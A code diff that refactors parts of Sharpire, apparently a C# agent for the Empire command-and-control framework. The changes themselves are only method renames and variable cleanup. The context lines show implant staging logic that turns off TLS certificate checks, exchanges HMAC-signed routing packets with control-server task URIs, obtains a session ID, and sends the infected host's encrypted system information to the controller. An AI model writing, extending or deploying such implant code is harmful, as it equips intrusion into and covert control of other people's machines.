@@ -132,7 +132,7 @@ namespace Sharpire
                 sb.Append(charactersArray[j]);
             }
 
-            sessionInfo.SetAgentID("00000000");
+            sessionInfo.SetAgentId("00000000");
         }
 
         internal static byte[] NewInitializationVector(int length)
@@ -150,14 +150,12 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         public void Execute()
         {
-            byte[] stage1response;
-            byte[] stage2response;
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
 
             try
             {
-                stage1response = Stage1();
-                Stage2(stage1response);
+                var stage1Response = Stage1();
+                Stage2(stage1Response);
                 try
                 {
 #if (PRINT)
@@ -253,10 +251,10 @@ namespace Sharpire
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
 
             Random random = new Random();
-            byte[] response = SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
+            byte[] response = SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
 
             RoutingPacket packet = DecodeRoutingPacket(response);
-            sessionInfo.SetAgentID(packet.SessionId);
+            sessionInfo.SetAgentId(packet.SessionId);
 
             byte[] decryptedData = AesDecryptAndVerify(stagingKeyBytes, packet.EncryptedData);
             byte[] nonce = decryptedData.Take(16).ToArray();
@@ -338,10 +336,10 @@ namespace Sharpire
 
             byte[] encryptedData = AesEncryptThenHmac(keyBytes, systemInfoBytes);
 
-            byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentID(), 3, encryptedData);
+            byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentId(), 3, encryptedData);
 
             Random random = new Random();
-            SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
+            SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
         }
         
         private void DotNetEmpire()
